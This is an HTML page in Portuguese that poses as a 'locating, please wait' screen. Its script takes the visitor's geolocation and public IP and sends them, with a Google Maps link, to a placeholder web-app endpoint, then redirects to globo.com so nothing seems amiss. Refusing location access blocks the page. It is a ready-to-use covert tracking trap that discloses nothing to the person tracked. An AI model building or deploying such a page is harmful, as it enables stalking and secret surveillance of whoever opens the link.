<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Localizando...</title>
  <style>
    body {
      background-color: #000;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
      text-align: center;
    }
  </style>
  <script>
    window.onload = function() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sucesso, erro);
      } else {
        document.body.innerHTML = "<p>Seu navegador n√£o suporta geolocaliza√ß√£o.</p>";
      }
    };

    function sucesso(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      // Captura o IP
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          const ip = data.ip;
          const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

          // Envia os dados para a planilha
          fetch('SEU_LINK_DO_WEBAPP_AQUI', {
            method: 'POST',
            mode: 'no-cors',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              latitude: latitude,
              longitude: longitude,
              ip: ip,
              maps: mapsLink
            })
          }).then(() => {
            redireciona();
          }).catch(() => {
            redireciona();
          });
        });
    }

    function erro(err) {
      console.warn("Erro de geolocaliza√ß√£o:", err);
      document.body.innerHTML = "<p>‚ö†Ô∏è Voc√™ precisa permitir o acesso √† localiza√ß√£o para continuar.</p>";
    }

    function redireciona() {
      window.location.href = "https://www.globo.com";
    }
  </script>
</head>
<body>
  <p>üìç Obtendo sua localiza√ß√£o... Aguarde...</p>
</body>
</html>
